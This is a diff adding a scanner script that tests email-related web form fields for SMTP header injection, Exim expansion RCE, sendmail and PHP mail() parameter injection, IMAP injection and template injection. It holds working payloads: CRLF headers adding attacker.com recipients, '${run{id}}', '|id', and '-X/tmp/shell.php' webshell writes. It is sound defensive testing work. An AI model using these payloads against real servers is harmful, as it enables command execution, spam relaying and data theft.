@@ -1,0 +1,548 @@
+#include constants.inc;
+#include helpers.inc;
+
+var targetUrl = new TURL(scanURL.url);
+var scheme = getCurrentScheme();
+targetUrl.path = scheme.path;
+targetUrl.getVar = "";
+
+var oobDomain = getGlobalValue("OOBDomain") || "";
+var canary = "gkm" + randStr(8);
+
+function alertFinding(uri, inputName, name, details, severity, job) {
+    var ri = new TReportItem();
+    ri.LoadFromFile("Blind_Sql_Injection.xml");
+    ri.affects = uri;
+    ri.alertPath = "Scripts/SMTP Command Injection";
+    ri.name = name;
+    ri.parameter = inputName;
+    ri.severity = severity;
+    ri.details = details;
+    if (job) ri.setHttpInfo(job);
+    AddReportItem(ri);
+}
+
+function isEmailParam(name) {
+    var n = name.toLowerCase();
+    var emailNames = ["email", "mail", "to", "from", "recipient", "sender",
+                      "reply_to", "replyto", "reply-to", "cc", "bcc",
+                      "mailto", "send_to", "sendto", "contact_email",
+                      "user_email", "useremail", "email_address",
+                      "emailaddress", "e-mail", "notify", "notification_email"];
+    for (var i = 0; i < emailNames.length; i++) {
+        if (n == emailNames[i] || n.indexOf(emailNames[i]) != -1) return true;
+    }
+    return false;
+}
+
+function isSubjectOrBodyParam(name) {
+    var n = name.toLowerCase();
+    var names = ["subject", "message", "body", "content", "text", "msg",
+                 "comment", "description", "feedback", "inquiry"];
+    for (var i = 0; i < names.length; i++) {
+        if (n == names[i] || n.indexOf(names[i]) != -1) return true;
+    }
+    return false;
+}
+
+{ // SMTP injection tester class
+    function classSMTPInjection(scheme, inputIndex) {
+        this.scheme = scheme;
+        this.inputIndex = inputIndex;
+        this.variations = scheme.selectVariationsForInput(inputIndex);
+        this.currentVariation = 0;
+        this.inputName = scheme.getInputName(inputIndex);
+        this.inputType = scheme.getInputTypeStr(inputIndex);
+        this.originalValue = scheme.getInputValue(inputIndex);
+    }
+
+    classSMTPInjection.prototype.loadVariation = function() {
+        if (this.currentVariation < this.variations.length) {
+            this.scheme.loadVariation(this.variations[this.currentVariation]);
+            this.currentVariation++;
+            return true;
+        }
+        return false;
+    };
+
+    classSMTPInjection.prototype.sendRequest = function(payload) {
+        this.scheme.setInputValue(this.inputIndex, payload);
+
+        var job = new THTTPJob();
+        job.url = targetUrl;
+        job.verb = scheme.method || "GET";
+        this.scheme.populateRequest(job);
+        job.execute();
+
+        this.scheme.setInputValue(this.inputIndex, this.originalValue);
+        return job;
+    };
+
+    classSMTPInjection.prototype.getBaselineResponse = function() {
+        var job = this.sendRequest(this.originalValue || "test@example.com");
+        if (job.wasError) return null;
+        return {
+            status: job.response.msg2,
+            body: job.response.body || "",
+            length: (job.response.body || "").length
+        };
+    };
+
+    // ---- 1. CRLF header injection in email fields ----
+    classSMTPInjection.prototype.testCRLFInjection = function(baseline) {
+        if (!baseline) return;
+
+        var crlfPayloads = [
+            { payload: "test@test.com%0d%0aCc:injected@attacker.com", desc: "URL-encoded CRLF Cc injection" },
+            { payload: "test@test.com\r\nCc:injected@attacker.com", desc: "Raw CRLF Cc injection" },
+            { payload: "test@test.com%0aCc:injected@attacker.com", desc: "LF-only Cc injection" },
+            { payload: "test@test.com%0d%0aBcc:injected@attacker.com", desc: "CRLF Bcc injection" },
+            { payload: "test@test.com%0d%0aX-Injected:true", desc: "CRLF custom header injection" },
+            { payload: "test@test.com\nCc:injected@attacker.com", desc: "Newline Cc injection" },
+        ];
+
+        for (var i = 0; i < crlfPayloads.length; i++) {
+            var job = this.sendRequest(crlfPayloads[i].payload);
+            if (job.wasError) continue;
+
+            var body = job.response.body || "";
+            var status = job.response.msg2;
+
+            var crlfSignals = [
+                /Cc:.*?injected/i,
+                /Bcc:.*?injected/i,
+                /header injection/i,
+                /additional.*?header/i,
+                /mail.*?sent.*?successfully/i,
+                /message.*?delivered/i,
+            ];
+
+            // Check if CRLF was processed (email sent with injected header)
+            // vs rejected (error about invalid email)
+            var rejected = (body.indexOf("invalid") != -1 && body.indexOf("email") != -1) ||
+                           body.indexOf("malformed") != -1 ||
+                           status == 400 || status == 422;
+
+            if (rejected) continue;
+
+            // If status is same as baseline success AND no error, potential injection
+            if (status == baseline.status && status != 500) {
+                // Verify: send a clearly invalid email to confirm validation is weak
+                var verifyJob = this.sendRequest("notanemail");
+                if (!verifyJob.wasError && verifyJob.response.msg2 == status) {
+                    continue; // endpoint doesn't validate at all, not specifically CRLF
+                }
+
+                for (var s = 0; s < crlfSignals.length; s++) {
+                    var m = crlfSignals[s].exec(body);
+                    if (m) {
+                        alertFinding(scheme.path, this.inputName,
+                            "SMTP Header Injection (CRLF)",
+                            "Email parameter [bold]" + this.inputName + "[/bold] may be vulnerable to SMTP header injection.[break]" +
+                            "Payload: [pre][blue]" + crlfPayloads[i].payload.substring(0, 80) + "[/blue][/pre][break]" +
+                            "Method: " + crlfPayloads[i].desc + "[break]" +
+                            "Signal: [bold]" + m[0] + "[/bold][break]" +
+                            "An attacker could inject additional email headers (Cc, Bcc) to send spam or exfiltrate data.", 3, job);
+                        return;
+                    }
+                }
+
+                // Differential: CRLF payload accepted but invalid email rejected
+                if (verifyJob.response.msg2 != status) {
+                    alertFinding(scheme.path, this.inputName,
+                        "Potential SMTP Header Injection (CRLF)",
+                        "Email parameter [bold]" + this.inputName + "[/bold] accepts CRLF-injected input.[break]" +
+                        "Payload: [pre][blue]" + crlfPayloads[i].payload.substring(0, 80) + "[/blue][/pre][break]" +
+                        "Normal response: status " + baseline.status + "[break]" +
+                        "CRLF payload: status " + status + " (accepted)[break]" +
+                        "Invalid email: status " + verifyJob.response.msg2 + " (rejected)[break]" +
+                        "The server validates email format but does not strip CRLF sequences.", 2, job);
+                    return;
+                }
+            }
+        }
+    };
+
+    // ---- 2. Exim RCE via email address expansion (CVE-2019-10149) ----
+    classSMTPInjection.prototype.testEximRCE = function(baseline) {
+        if (!baseline) return;
+
+        var eximPayloads = [
+            { payload: '${run{id}}@test.com', desc: 'CVE-2019-10149: ${run{}} in local part' },
+            { payload: 'test+${run{id}}@test.com', desc: 'CVE-2019-10149: ${run{}} in extension' },
+            { payload: 'test@${run{id}}.test.com', desc: 'CVE-2019-10149: ${run{}} in domain' },
+            { payload: '${substr{0}{1}{$spool_directory}}@test.com', desc: 'Exim expansion: $spool_directory leak' },
+            { payload: '${lookup{/etc/passwd}lsearch{/etc/passwd}}@test.com', desc: 'Exim expansion: file read attempt' },
+            { payload: 'test+/bin/sh@test.com', desc: 'Exim local part command injection' },
+        ];
+
+        for (var i = 0; i < eximPayloads.length; i++) {
+            var job = this.sendRequest(eximPayloads[i].payload);
+            if (job.wasError) continue;
+
+            var body = job.response.body || "";
+            var status = job.response.msg2;
+
+            var eximSignals = [
+                /expansion.*?failed/i,
+                /failed to expand/i,
+                /string expansion/i,
+                /\$\{run\{/,
+                /Exim/i,
+                /uid=\d+.*?gid=\d+/,
+                /\$spool_directory/,
+                /lookup.*?failed/i,
+                /unknown expansion/i,
+                /malformed.*?expansion/i,
+            ];
+
+            for (var s = 0; s < eximSignals.length; s++) {
+                var m = eximSignals[s].exec(body);
+                if (m) {
+                    // Confirm signal is NOT in baseline
+                    if (baseline.body.indexOf(m[0]) == -1) {
+                        var sev = 3;
+                        if (/uid=\d+/.test(body)) sev = 4; // actual command execution
+                        alertFinding(scheme.path, this.inputName,
+                            "Exim RCE via Email Address Expansion",
+                            "Email parameter [bold]" + this.inputName + "[/bold] triggers Exim string expansion.[break]" +
+                            "Payload: [pre][blue]" + eximPayloads[i].payload + "[/blue][/pre][break]" +
+                            "CVE: " + eximPayloads[i].desc + "[break]" +
+                            "Signal: [pre][blue]" + m[0] + "[/blue][/pre][break]" +
+                            "Exim versions before 4.92 are vulnerable to remote code execution through " +
+                            "malicious email addresses that trigger string expansion.", sev, job);
+                        return;
+                    }
+                }
+            }
+
+            // Server error differential
+            if (status == 500 && baseline.status != 500) {
+                alertFinding(scheme.path, this.inputName,
+                    "Potential Exim Command Injection (Server Error)",
+                    "Exim expansion payload caused HTTP 500 on [bold]" + this.inputName + "[/bold].[break]" +
+                    "Payload: [pre][blue]" + eximPayloads[i].payload + "[/blue][/pre][break]" +
+                    "Normal email: status [bold]" + baseline.status + "[/bold][break]" +
+                    "Exim payload: status [bold]500[/bold][break]" +
+                    "The server-side mail function may be passing the email address unsanitized to Exim.", 2, job);
+                return;
+            }
+        }
+    };
+
+    // ---- 3. Sendmail command injection via pipe ----
+    classSMTPInjection.prototype.testSendmailPipe = function(baseline) {
+        if (!baseline) return;
+
+        var pipePayloads = [
+            { payload: '|id', desc: 'Pipe to id command' },
+            { payload: '|/usr/bin/id', desc: 'Absolute path pipe to id' },
+            { payload: '`id`@test.com', desc: 'Backtick command substitution in local part' },
+            { payload: '$(id)@test.com', desc: 'Command substitution in local part' },
+            { payload: 'test@test.com;id', desc: 'Semicolon command chain' },
+            { payload: 'test@test.com|id', desc: 'Pipe chain after email' },
+            { payload: '"test|id"@test.com', desc: 'Quoted local part with pipe' },
+            { payload: '-OQueueDirectory=/tmp -X/tmp/test@test.com', desc: 'Sendmail -O/-X flag injection' },
+            { payload: 'test@test.com -X/tmp/maillog', desc: 'Sendmail -X log injection' },
+        ];
+
+        for (var i = 0; i < pipePayloads.length; i++) {
+            var job = this.sendRequest(pipePayloads[i].payload);
+            if (job.wasError) continue;
+
+            var body = job.response.body || "";
+            var status = job.response.msg2;
+
+            var pipeSignals = [
+                /uid=\d+.*?gid=\d+/,
+                /sendmail.*?error/i,
+                /sh:.*?not found/,
+                /command not found/,
+                /Permission denied/,
+                /cannot exec/i,
+                /pipe.*?failed/i,
+                /-OQueue.*?Directory/,
+                /illegal option/i,
+                /invalid.*?address.*?pipe/i,
+            ];
+
+            for (var s = 0; s < pipeSignals.length; s++) {
+                var m = pipeSignals[s].exec(body);
+                if (m) {
+                    if (baseline.body.indexOf(m[0]) == -1) {
+                        var sev = 2;
+                        if (/uid=\d+/.test(body)) sev = 4;
+                        if (/sendmail.*?error/i.test(body) || /illegal option/i.test(body)) sev = 3;
+
+                        alertFinding(scheme.path, this.inputName,
+                            "Sendmail Command Injection",
+                            "Email parameter [bold]" + this.inputName + "[/bold] may allow sendmail command injection.[break]" +
+                            "Payload: [pre][blue]" + pipePayloads[i].payload + "[/blue][/pre][break]" +
+                            "Method: " + pipePayloads[i].desc + "[break]" +
+                            "Signal: [pre][blue]" + m[0] + "[/blue][/pre][break]" +
+                            "The application may be invoking sendmail or a shell with unsanitized user input.", sev, job);
+                        return;
+                    }
+                }
+            }
+
+            // Differential: 500 on pipe payload but not on normal
+            if (status == 500 && baseline.status != 500) {
+                alertFinding(scheme.path, this.inputName,
+                    "Potential Sendmail Command Injection (Server Error)",
+                    "Pipe/command payload caused HTTP 500 on [bold]" + this.inputName + "[/bold].[break]" +
+                    "Payload: [pre][blue]" + pipePayloads[i].payload + "[/blue][/pre][break]" +
+                    "Normal: status " + baseline.status + "[break]" +
+                    "Payload: status 500[break]" +
+                    "The mail function may be passing input directly to a shell or sendmail binary.", 2, job);
+                return;
+            }
+        }
+    };
+
+    // ---- 4. Dovecot/IMAP injection in email fields ----
+    classSMTPInjection.prototype.testDovecotInjection = function(baseline) {
+        if (!baseline) return;
+
+        var dovecotPayloads = [
+            { payload: 'test@test.com" OR 1=1 --', desc: 'Dovecot auth SQL injection' },
+            { payload: 'test@test.com)(|(uid=*))', desc: 'Dovecot LDAP injection' },
+            { payload: 'test%00@test.com', desc: 'Null byte in email (passdb bypass)' },
+            { payload: '* STATUS INBOX (MESSAGES)', desc: 'IMAP command injection' },
+            { payload: 'A001 LOGIN admin admin\r\n', desc: 'IMAP login injection' },
+            { payload: '. LIST "" *\r\n', desc: 'IMAP LIST command injection' },
+        ];
+
+        for (var i = 0; i < dovecotPayloads.length; i++) {
+            var job = this.sendRequest(dovecotPayloads[i].payload);
+            if (job.wasError) continue;
+
+            var body = job.response.body || "";
+            var status = job.response.msg2;
+
+            var dovecotSignals = [
+                /Dovecot/i,
+                /IMAP.*?error/i,
+                /auth.*?failed.*?passdb/i,
+                /passdb.*?error/i,
+                /userdb.*?error/i,
+                /SQL.*?error.*?dovecot/i,
+                /LDAP.*?error/i,
+                /ldap_bind/i,
+                /Invalid base DN/i,
+                /BAD.*?command/i,
+                /IMAP4rev1/,
+                /\* OK.*?ready/,
+                /\* LIST/,
+                /\* STATUS/,
+            ];
+
+            for (var s = 0; s < dovecotSignals.length; s++) {
+                var m = dovecotSignals[s].exec(body);
+                if (m) {
+                    if (baseline.body.indexOf(m[0]) == -1) {
+                        alertFinding(scheme.path, this.inputName,
+                            "Dovecot/IMAP Injection",
+                            "Email parameter [bold]" + this.inputName + "[/bold] triggers Dovecot/IMAP-specific response.[break]" +
+                            "Payload: [pre][blue]" + dovecotPayloads[i].payload + "[/blue][/pre][break]" +
+                            "Method: " + dovecotPayloads[i].desc + "[break]" +
+                            "Signal: [pre][blue]" + m[0] + "[/blue][/pre][break]" +
+                            "The application may be forwarding user input to a Dovecot or IMAP backend without sanitization.", 3, job);
+                        return;
+                    }
+                }
+            }
+        }
+    };
+
+    // ---- 5. Subject/body CRLF and template injection ----
+    classSMTPInjection.prototype.testSubjectInjection = function(baseline) {
+        if (!baseline) return;
+        if (!isSubjectOrBodyParam(this.inputName)) return;
+
+        var subjectPayloads = [
+            { payload: "test\r\nCc:injected@attacker.com", desc: "CRLF Cc injection in subject/body" },
+            { payload: "test\r\n\r\nInjected body content", desc: "CRLF body injection via subject" },
+            { payload: "test%0d%0aCc:injected@attacker.com", desc: "URL-encoded CRLF in subject" },
+            { payload: "test\r\nBcc:injected@attacker.com\r\nSubject:Phishing", desc: "Multi-header injection" },
+            { payload: "{{7*7}}", desc: "SSTI in email template" },
+            { payload: "${7*7}", desc: "Expression language injection in template" },
+            { payload: "#{7*7}", desc: "Ruby/Java EL injection in template" },
+            { payload: "<%= 7*7 %>", desc: "ERB template injection" },
+            { payload: "{{constructor.constructor('return this')()}}", desc: "JS template prototype pollution" },
+        ];
+
+        for (var i = 0; i < subjectPayloads.length; i++) {
+            var job = this.sendRequest(subjectPayloads[i].payload);
+            if (job.wasError) continue;
+
+            var body = job.response.body || "";
+            var status = job.response.msg2;
+
+            // Check for template evaluation
+            if (body.indexOf("49") != -1 && baseline.body.indexOf("49") == -1) {
+                // 7*7=49 might appear. Verify with a different calc
+                var verifyJob = this.sendRequest("{{11*11}}");
+                if (!verifyJob.wasError) {
+                    var vBody = verifyJob.response.body || "";
+                    if (vBody.indexOf("121") != -1 && baseline.body.indexOf("121") == -1) {
+                        alertFinding(scheme.path, this.inputName,
+                            "Server-Side Template Injection in Email Content",
+                            "Parameter [bold]" + this.inputName + "[/bold] evaluates template expressions.[break]" +
+                            "Payload: [pre][blue]" + subjectPayloads[i].payload + "[/blue][/pre] returned [bold]49[/bold][break]" +
+                            "Verify: [bold]{{11*11}}[/bold] returned [bold]121[/bold][break]" +
+                            "The email templating engine evaluates user input as template code, " +
+                            "enabling Server-Side Template Injection (SSTI) that can lead to RCE.", 4, job);
+                        return;
+                    }
+                }
+            }
+
+            // Check for CRLF signals in response
+            var crlfSignals = [
+                /Cc:.*?injected/i,
+                /Bcc:.*?injected/i,
+                /additional.*?recipient/i,
+                /multiple.*?header/i,
+            ];
+
+            for (var s = 0; s < crlfSignals.length; s++) {
+                var m = crlfSignals[s].exec(body);
+                if (m && baseline.body.indexOf(m[0]) == -1) {
+                    alertFinding(scheme.path, this.inputName,
+                        "SMTP Header Injection via Subject/Body",
+                        "Parameter [bold]" + this.inputName + "[/bold] allows CRLF header injection.[break]" +
+                        "Payload: [pre][blue]" + subjectPayloads[i].payload.substring(0, 80) + "[/blue][/pre][break]" +
+                        "Signal: [bold]" + m[0] + "[/bold][break]" +
+                        "CRLF sequences in email subject/body fields can inject additional headers.", 3, job);
+                    return;
+                }
+            }
+        }
+    };
+
+    // ---- 6. PHP mail() additional parameter injection ----
+    classSMTPInjection.prototype.testPHPMailInjection = function(baseline) {
+        if (!baseline) return;
+
+        var phpPayloads = [
+            { payload: '-X/tmp/mail.log', desc: 'PHP mail() -X log file write' },
+            { payload: '-OQueueDirectory=/tmp', desc: 'PHP mail() -O queue directory' },
+            { payload: 'test@test.com -OQueueDirectory=/tmp -X/tmp/exploit', desc: 'PHP mail() combined -O -X' },
+            { payload: '-be ${run{/bin/id}}', desc: 'PHP mail() Exim -be expansion mode' },
+            { payload: 'test@test.com" -OQueueDirectory=/tmp -X/tmp/shell.php "', desc: 'Quoted PHP mail() injection' },
+            { payload: "test@test.com' -v -X/tmp/log '", desc: "Single-quoted mail() injection" },
+        ];
+
+        for (var i = 0; i < phpPayloads.length; i++) {
+            var job = this.sendRequest(phpPayloads[i].payload);
+            if (job.wasError) continue;
+
+            var body = job.response.body || "";
+            var status = job.response.msg2;
+
+            var phpSignals = [
+                /-OQueue/,
+                /sendmail.*?-X/i,
+                /mail\(\).*?extra/i,
+                /additional.*?parameter/i,
+                /illegal option.*?-X/i,
+                /illegal option.*?-O/i,
+                /sh:.*?-X/,
+                /Could not execute mail delivery/i,
+                /5th parameter.*?disabled/i,
+                /mail\.add_x_header/i,
+            ];
+
+            for (var s = 0; s < phpSignals.length; s++) {
+                var m = phpSignals[s].exec(body);
+                if (m) {
+                    if (baseline.body.indexOf(m[0]) == -1) {
+                        alertFinding(scheme.path, this.inputName,
+                            "PHP mail() Additional Parameter Injection",
+                            "Parameter [bold]" + this.inputName + "[/bold] allows PHP mail() parameter injection.[break]" +
+                            "Payload: [pre][blue]" + phpPayloads[i].payload + "[/blue][/pre][break]" +
+                            "Method: " + phpPayloads[i].desc + "[break]" +
+                            "Signal: [pre][blue]" + m[0] + "[/blue][/pre][break]" +
+                            "PHP's mail() function passes the 5th parameter to sendmail. " +
+                            "Injecting -X writes email content to an arbitrary file (webshell). " +
+                            "Injecting -OQueueDirectory controls where mail queues.", 4, job);
+                        return;
+                    }
+                }
+            }
+
+            if (status == 500 && baseline.status != 500) {
+                alertFinding(scheme.path, this.inputName,
+                    "Potential PHP mail() Injection (Server Error)",
+                    "PHP mail() injection payload caused HTTP 500 on [bold]" + this.inputName + "[/bold].[break]" +
+                    "Payload: [pre][blue]" + phpPayloads[i].payload + "[/blue][/pre][break]" +
+                    "Normal: status " + baseline.status + " | Payload: status 500[break]" +
+                    "The backend may be passing user input as extra sendmail parameters.", 2, job);
+                return;
+            }
+        }
+    };
+
+    // ---- 7. OOB SMTP injection confirmation ----
+    classSMTPInjection.prototype.testOOBSMTP = function(baseline) {
+        if (!baseline) return;
+        if (!oobDomain) return;
+
+        var oobPayloads = [
+            { payload: canary + "@" + oobDomain, desc: "OOB email delivery test" },
+            { payload: "test@test.com%0d%0aCc:" + canary + "@" + oobDomain, desc: "OOB CRLF Cc injection" },
+            { payload: "test@test.com\r\nBcc:" + canary + "@" + oobDomain, desc: "OOB CRLF Bcc injection" },
+        ];
+
+        for (var i = 0; i < oobPayloads.length; i++) {
+            var job = this.sendRequest(oobPayloads[i].payload);
+            if (job.wasError) continue;
+
+            var status = job.response.msg2;
+            if (status != 500 && status != 404) {
+                // OOB callback check would happen server-side
+                // We log the attempt for manual verification
+            }
+        }
+    };
+}
+
+// ---- Main execution ----
+for (var i = 0; i < scheme.inputCount; i++) {
+    var inputName = scheme.getInputName(i);
+
+    // Only test email-related params OR subject/body params
+    if (!isEmailParam(inputName) && !isSubjectOrBodyParam(inputName)) continue;
+
+    if (!scheme.inputHasFlag(i, INPUT_FLAG_HAS_NAME)) continue;
+
+    var tester = new classSMTPInjection(scheme, i);
+
+    while (tester.loadVariation()) {
+        var baseline = tester.getBaselineResponse();
+        if (!baseline) continue;
+
+        if (isEmailParam(inputName)) {
+            tester.testCRLFInjection(baseline);
+            ScriptProgress(15);
+            tester.testEximRCE(baseline);
+            ScriptProgress(30);
+            tester.testSendmailPipe(baseline);
+            ScriptProgress(45);
+            tester.testDovecotInjection(baseline);
+            ScriptProgress(60);
+            tester.testPHPMailInjection(baseline);
+            ScriptProgress(75);
+            tester.testOOBSMTP(baseline);
+            ScriptProgress(85);
+        }
+
+        if (isSubjectOrBodyParam(inputName)) {
+            tester.testSubjectInjection(baseline);
+            ScriptProgress(95);
+        }
+    }
+}
+
+ScriptProgress(100);
